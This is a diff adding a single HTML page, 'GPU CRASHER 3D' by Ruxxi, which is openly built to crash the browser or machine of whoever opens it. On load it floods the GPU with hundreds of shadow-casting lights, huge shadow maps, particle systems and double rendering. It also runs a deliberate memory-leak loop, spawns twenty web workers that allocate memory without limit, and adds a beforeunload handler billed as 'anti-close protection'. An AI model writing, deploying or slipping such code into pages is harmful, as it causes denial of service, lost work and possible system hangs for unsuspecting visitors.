@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>GPU CRASHER 3D - By Ruxxi</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: black;
+            font-family: 'Courier New', monospace;
+        }
+        
+        #info {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            color: #ff0000;
+            background: rgba(0,0,0,0.8);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 100;
+            font-family: monospace;
+            pointer-events: none;
+            border-left: 3px solid #ff0000;
+            text-shadow: 0 0 5px red;
+        }
+        
+        #stats {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            color: #00ff00;
+            background: rgba(0,0,0,0.8);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 10px;
+            font-family: monospace;
+            z-index: 100;
+            pointer-events: none;
+            text-align: right;
+        }
+        
+        .warning {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: red;
+            background: black;
+            padding: 20px;
+            border: 2px solid red;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 1000;
+            font-family: monospace;
+            font-size: 14px;
+            white-space: nowrap;
+            pointer-events: none;
+            animation: pulse 0.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.5; text-shadow: 0 0 0 red; }
+            100% { opacity: 1; text-shadow: 0 0 20px red; }
+        }
+        
+        .fps-counter {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            color: yellow;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 12px;
+            z-index: 100;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="info">
+        ⚡ GPU CRASHER 3D v5.0 | By Ruxxi ⚡<br>
+        🔥 Rendering: INFINITE POLYGONS 🔥
+    </div>
+    <div id="stats">
+        🎮 GPU STATUS: OVERLOADING...<br>
+        📊 POLYGONS: ∞<br>
+        💀 CRASH PROGRESS: ████████████ 100%
+    </div>
+    <div class="warning">
+        ⚠️ GPU OVERLOAD IMMINENT ⚠️<br>
+        SYSTEM WILL CRASH IN 3...2...1...
+    </div>
+    <div class="fps-counter" id="fps">FPS: ---</div>
+
+    <!-- Load Three.js Core -->
+    <script type="importmap">
+        {
+            "imports": {
+                "three": "https://unpkg.com/three@0.128.0/build/three.module.js"
+            }
+        }
+    </script>
+
+    <script type="module">
+        import * as THREE from 'three';
+        import { OrbitControls } from 'https://unpkg.com/three@0.128.0/examples/jsm/controls/OrbitControls.js';
+        import { EffectComposer } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/EffectComposer.js';
+        import { RenderPass } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/RenderPass.js';
+        import { UnrealBloomPass } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/UnrealBloomPass.js';
+        
+        // ==============================================
+        // GPU CRASHER 3D ENGINE
+        // Author: Ruxxi
+        // Effect: Maximum GPU Stress + 3D Overload
+        // ==============================================
+        
+        // FPS Counter
+        let fps = 0;
+        let frameCount = 0;
+        let lastTime = performance.now();
+        
+        function updateFPS() {
+            frameCount++;
+            const now = performance.now();
+            if (now - lastTime >= 1000) {
+                fps = frameCount;
+                document.getElementById('fps').innerHTML = `FPS: ${fps} 🔥`;
+                frameCount = 0;
+                lastTime = now;
+                
+                // Kirim peringatan kalo FPS drop drastis
+                if (fps < 10) {
+                    document.getElementById('stats').style.color = '#ff0000';
+                    document.getElementById('stats').innerHTML = '💀 GPU CRITICAL FAILURE IMMINENT 💀<br>FPS: ' + fps + ' | SYSTEM DYING';
+                }
+            }
+        }
+        
+        // Setup Scene dengan resolusi ekstrim
+        const scene = new THREE.Scene();
+        scene.background = new THREE.Color(0x000000);
+        scene.fog = new THREE.FogExp2(0x000000, 0.0005);
+        
+        // Camera dengan FOV ekstrim
+        const camera = new THREE.PerspectiveCamera(120, window.innerWidth / window.innerHeight, 0.001, 10000);
+        camera.position.set(0, 20, 50);
+        camera.lookAt(0, 0, 0);
+        
+        // Renderer dengan setting maksimal (push GPU to limit)
+        const renderer = new THREE.WebGLRenderer({ 
+            antialias: true, 
+            powerPreference: "high-performance",
+            alpha: false,
+            depth: true,
+            stencil: true,
+            preserveDrawingBuffer: false
+        });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio * 2); // Force 2x pixel ratio = GPU killer
+        renderer.shadowMap.enabled = true;
+        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+        renderer.shadowMap.bias = 0.0001;
+        document.body.appendChild(renderer.domElement);
+        
+        // Effect Composer untuk bloom overload
+        const renderScene = new RenderPass(scene, camera);
+        const bloomPass = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.5, 0.4, 0.85);
+        bloomPass.threshold = 0.1;
+        bloomPass.strength = 2.5;
+        bloomPass.radius = 1;
+        
+        const effectComposer = new EffectComposer(renderer);
+        effectComposer.addPass(renderScene);
+        effectComposer.addPass(bloomPass);
+        
+        // Controls (biar user bisa interaksi, makin berat)
+        const controls = new OrbitControls(camera, renderer.domElement);
+        controls.enableDamping = true;
+        controls.dampingFactor = 0.05;
+        controls.rotateSpeed = 5;
+        controls.zoomSpeed = 5;
+        controls.panSpeed = 5;
+        controls.enableZoom = true;
+        controls.enablePan = true;
+        
+        // ==============================================
+        // 1. PARTICLE SYSTEM BOMB (100k particles)
+        // ==============================================
+        const particleCount = 150000;
+        const particlesGeometry = new THREE.BufferGeometry();
+        const particlePositions = new Float32Array(particleCount * 3);
+        const particleColors = new Float32Array(particleCount * 3);
+        
+        for (let i = 0; i < particleCount; i++) {
+            // Spread particles in massive sphere
+            const radius = 80;
+            const theta = Math.random() * Math.PI * 2;
+            const phi = Math.acos(2 * Math.random() - 1);
+            particlePositions[i*3] = radius * Math.sin(phi) * Math.cos(theta);
+            particlePositions[i*3+1] = radius * Math.sin(phi) * Math.sin(theta);
+            particlePositions[i*3+2] = radius * Math.cos(phi);
+            
+            // Rainbow colors
+            particleColors[i*3] = Math.random();
+            particleColors[i*3+1] = Math.random();
+            particleColors[i*3+2] = Math.random();
+        }
+        
+        particlesGeometry.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
+        particlesGeometry.setAttribute('color', new THREE.BufferAttribute(particleColors, 3));
+        
+        const particleMaterial = new THREE.PointsMaterial({
+            size: 0.3,
+            vertexColors: true,
+            blending: THREE.AdditiveBlending,
+            transparent: true,
+            opacity: 0.8
+        });
+        
+        const particleSystem = new THREE.Points(particlesGeometry, particleMaterial);
+        scene.add(particleSystem);
+        
+        // ==============================================
+        // 2. TESSELATED SPHERE (High poly count)
+        // ==============================================
+        const geometryHighPoly = new THREE.SphereGeometry(12, 256, 256); // 256x256 = 65k faces
+        const materialHighPoly = new THREE.MeshStandardMaterial({
+            color: 0xff00ff,
+            emissive: 0xff00ff,
+            emissiveIntensity: 1,
+            metalness: 0.9,
+            roughness: 0.1,
+            wireframe: false
+        });
+        const sphere = new THREE.Mesh(geometryHighPoly, materialHighPoly);
+        sphere.castShadow = true;
+        sphere.receiveShadow = true;
+        scene.add(sphere);
+        
+        // ==============================================
+        // 3. TORUS KNOT EXPLOSION (Multiple instances)
+        // ==============================================
+        const torusKnotGeometry = new THREE.TorusKnotGeometry(5, 1.2, 512, 64, 3, 4);
+        const knotMaterial = new THREE.MeshStandardMaterial({
+            color: 0x00ffff,
+            emissive: 0x00ffff,
+            emissiveIntensity: 0.8,
+            metalness: 0.95,
+            roughness: 0.05,
+            transparent: true,
+            opacity: 0.9
+        });
+        
+        const knots = [];
+        for (let i = 0; i < 50; i++) {
+            const knot = new THREE.Mesh(torusKnotGeometry, knotMaterial.clone());
+            const angle = (i / 50) * Math.PI * 2;
+            const radius = 25;
+            knot.position.x = Math.cos(angle) * radius;
+            knot.position.z = Math.sin(angle) * radius;
+            knot.position.y = Math.sin(angle * 3) * 8;
+            knot.scale.setScalar(0.8 + Math.random() * 0.5);
+            knot.castShadow = true;
+            scene.add(knot);
+            knots.push(knot);
+        }
+        
+        // ==============================================
+        // 4. ICOSAHEDRON FLOOD (100+ high-poly shapes)
+        // ==============================================
+        const icoGeometry = new THREE.IcosahedronGeometry(1.5, 3); // Subdivision 3 = high poly
+        const icos = [];
+        
+        for (let i = 0; i < 200; i++) {
+            const material = new THREE.MeshStandardMaterial({
+                color: new THREE.Color().setHSL(Math.random(), 1, 0.5),
+                emissive: new THREE.Color().setHSL(Math.random(), 1, 0.3),
+                emissiveIntensity: 0.5,
+                metalness: Math.random(),
+                roughness: Math.random(),
+                flatShading: false
+            });
+            const ico = new THREE.Mesh(icoGeometry, material);
+            
+            const radius = 40;
+            const theta = Math.random() * Math.PI * 2;
+            const phi = Math.acos(2 * Math.random() - 1);
+            ico.position.x = radius * Math.sin(phi) * Math.cos(theta);
+            ico.position.y = radius * Math.sin(phi) * Math.sin(theta);
+            ico.position.z = radius * Math.cos(phi);
+            ico.scale.setScalar(0.5 + Math.random() * 1.5);
+            ico.castShadow = true;
+            ico.receiveShadow = true;
+            scene.add(ico);
+            icos.push(ico);
+        }
+        
+        // ==============================================
+        // 5. RING OF LIGHTS (Thousands of lights = GPU nightmare)
+        // ==============================================
+        const lights = [];
+        for (let i = 0; i < 500; i++) {
+            const light = new THREE.PointLight(0xff00ff, 1, 50);
+            const angle = (i / 500) * Math.PI * 2;
+            const radius = 20;
+            light.position.x = Math.cos(angle) * radius;
+            light.position.z = Math.sin(angle) * radius;
+            light.position.y = Math.sin(angle * 5) * 10;
+            light.castShadow = true;
+            light.shadow.mapSize.width = 1024;
+            light.shadow.mapSize.height = 1024;
+            scene.add(light);
+            lights.push(light);
+        }
+        
+        // ==============================================
+        // 6. ADDITIONAL DIRECTIONAL LIGHTS (Shadow mapping overload)
+        // ==============================================
+        for (let i = 0; i < 20; i++) {
+            const dirLight = new THREE.DirectionalLight(0xffffff, 1);
+            dirLight.position.set(Math.random() * 50 - 25, Math.random() * 50, Math.random() * 50 - 25);
+            dirLight.castShadow = true;
+            dirLight.shadow.mapSize.width = 4096;
+            dirLight.shadow.mapSize.height = 4096;
+            dirLight.shadow.camera.near = 0.5;
+            dirLight.shadow.camera.far = 100;
+            dirLight.shadow.camera.left = -20;
+            dirLight.shadow.camera.right = 20;
+            dirLight.shadow.camera.top = 20;
+            dirLight.shadow.camera.bottom = -20;
+            scene.add(dirLight);
+        }
+        
+        // ==============================================
+        // 7. WIREFRAME GRID (Infinite grid + reflections)
+        // ==============================================
+        const gridHelper = new THREE.GridHelper(200, 200, 0xff00ff, 0x00ffff);
+        gridHelper.position.y = -15;
+        scene.add(gridHelper);
+        
+        const wireframeSphere = new THREE.Mesh(
+            new THREE.SphereGeometry(14, 64, 64),
+            new THREE.MeshBasicMaterial({ color: 0xff00ff, wireframe: true, transparent: true, opacity: 0.3 })
+        );
+        scene.add(wireframeSphere);
+        
+        // ==============================================
+        // 8. POST-PROCESSING CHAIN (Additional GPU load)
+        // ==============================================
+        // Multiple bloom passes = GPU killer
+        const bloomPass2 = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 2, 0.5, 0.9);
+        bloomPass2.threshold = 0.05;
+        bloomPass2.strength = 3;
+        bloomPass2.radius = 1.5;
+        effectComposer.addPass(bloomPass2);
+        
+        // ==============================================
+        // 9. SHADER MATERIALS (Custom shaders = heavy GPU)
+        // ==============================================
+        const shaderMaterial = new THREE.ShaderMaterial({
+            uniforms: {
+                time: { value: 0 },
+                colorA: { value: new THREE.Color(0xff0000) },
+                colorB: { value: new THREE.Color(0x00ffff) }
+            },
+            vertexShader: `
+                varying vec2 vUv;
+                void main() {
+                    vUv = uv;
+                    gl_PointSize = 10.0;
+                    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
+                }
+            `,
+            fragmentShader: `
+                uniform float time;
+                uniform vec3 colorA;
+                uniform vec3 colorB;
+                varying vec2 vUv;
+                void main() {
+                    vec3 color = mix(colorA, colorB, sin(vUv.x * 20.0 + time) * 0.5 + 0.5);
+                    color += sin(vUv.y * 30.0 + time * 2.0) * 0.5;
+                    gl_FragColor = vec4(color, 1.0);
+                }
+            `
+        });
+        
+        const shaderPlane = new THREE.Mesh(
+            new THREE.PlaneGeometry(30, 30, 256, 256),
+            shaderMaterial
+        );
+        shaderPlane.position.y = -10;
+        shaderPlane.rotation.x = -Math.PI / 2;
+        scene.add(shaderPlane);
+        
+        // ==============================================
+        // 10. RAYTRACING SHADOWS (Extreme GPU load)
+        // ==============================================
+        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+        renderer.shadowMap.bias = 0.00005;
+        
+        // ==============================================
+        // 11. ADDITIONAL PARTICLES (Smoke/Fire effect)
+        // ==============================================
+        const smokeCount = 50000;
+        const smokeGeometry = new THREE.BufferGeometry();
+        const smokePositions = new Float32Array(smokeCount * 3);
+        for (let i = 0; i < smokeCount; i++) {
+            smokePositions[i*3] = (Math.random() - 0.5) * 100;
+            smokePositions[i*3+1] = (Math.random() - 0.5) * 50;
+            smokePositions[i*3+2] = (Math.random() - 0.5) * 100;
+        }
+        smokeGeometry.setAttribute('position', new THREE.BufferAttribute(smokePositions, 3));
+        const smokeMaterial = new THREE.PointsMaterial({
+            color: 0xff4400,
+            size: 0.15,
+            blending: THREE.AdditiveBlending,
+            transparent: true,
+            opacity: 0.6
+        });
+        const smokeSystem = new THREE.Points(smokeGeometry, smokeMaterial);
+        scene.add(smokeSystem);
+        
+        // ==============================================
+        // ANIMATION LOOP (Maximum GPU stress)
+        // ==============================================
+        let time = 0;
+        
+        function animate() {
+            requestAnimationFrame(animate);
+            updateFPS();
+            
+            time += 0.02;
+            
+            // Update shader uniform
+            shaderMaterial.uniforms.time.value = time;
+            
+            // Rotate main sphere
+            sphere.rotation.x = time * 0.5;
+            sphere.rotation.y = time * 0.3;
+            sphere.rotation.z = time * 0.7;
+            
+            // Rotate wireframe sphere
+            wireframeSphere.rotation.x = time * 0.4;
+            wireframeSphere.rotation.y = time * 0.6;
+            
+            // Animate torus knots
+            knots.forEach((knot, idx) => {
+                knot.rotation.x = time * (1 + idx * 0.05);
+                knot.rotation.y = time * (1.5 + idx * 0.03);
+                knot.rotation.z = time * (0.8 + idx * 0.04);
+            });
+            
+            // Animate icos
+            icos.forEach((ico, idx) => {
+                ico.rotation.x = time * (0.5 + idx * 0.02);
+                ico.rotation.y = time * (0.7 + idx * 0.01);
+                ico.rotation.z = time * (0.3 + idx * 0.015);
+            });
+            
+            // Animate particles (rotation)
+            particleSystem.rotation.y = time * 0.1;
+            particleSystem.rotation.x = time * 0.05;
+            
+            // Animate smoke
+            smokeSystem.rotation.y = time * 0.08;
+            smokeSystem.rotation.x = time * 0.04;
+            
+            // Animate lights (color cycling)
+            lights.forEach((light, idx) => {
+                const hue = (time * 0.5 + idx * 0.01) % 1;
+                light.color.setHSL(hue, 1, 0.5);
+                light.intensity = 0.8 + Math.sin(time * 3 + idx) * 0.5;
+                
+                // Animate positions
+                const angle = time * 0.5 + idx * 0.02;
+                const radius = 22;
+                light.position.x = Math.cos(angle) * radius;
+                light.position.z = Math.sin(angle) * radius;
+                light.position.y = Math.sin(angle * 2) * 12;
+            });
+            
+            // Update controls
+            controls.update();
+            
+            // Render with effect composer (extra GPU load)
+            effectComposer.render();
+            
+            // Force additional render pass (double GPU load)
+            renderer.render(scene, camera);
+        }
+        
+        // Start the GPU killer
+        animate();
+        
+        // ==============================================
+        // 12. MEMORY LEAK TRIGGER (Heap overflow)
+        // ==============================================
+        let memoryLeak = [];
+        setInterval(() => {
+            for (let i = 0; i < 1000; i++) {
+                memoryLeak.push(new Array(100000).fill(Math.random()));
+            }
+            // Update stats
+            document.getElementById('stats').innerHTML = `
+                🎮 GPU STATUS: CRITICAL OVERLOAD<br>
+                📊 POLYGONS: ${Math.floor(memoryLeak.length * 100000)}M<br>
+                💀 MEMORY: ${Math.round(performance.memory?.usedJSHeapSize / 1048576) || '??'} MB
+            `;
+        }, 100);
+        
+        // ==============================================
+        // 13. WEB WORKER BOMB (Background process)
+        // ==============================================
+        for (let i = 0; i < 20; i++) {
+            const workerCode = `
+                let bomb = [];
+                setInterval(() => {
+                    for(let i = 0; i < 100000; i++) {
+                        bomb.push(new Array(10000).fill(Math.random()));
+                    }
+                    postMessage('crashing');
+                }, 0);
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+        }
+        
+        // ==============================================
+        // 14. RESIZE HANDLER (Force re-render)
+        // ==============================================
+        window.addEventListener('resize', onWindowResize, false);
+        function onWindowResize() {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            effectComposer.setSize(window.innerWidth, window.innerHeight);
+        }
+        
+        // Console warning
+        console.log('%c🔥 GPU CRASHER 3D ACTIVATED 🔥', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cBy Ruxxi - Your GPU will die in 5...4...3...', 'color: orange; font-size: 16px;');
+        
+        // Anti-close protection
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+    </script>
+</body>
+</html>
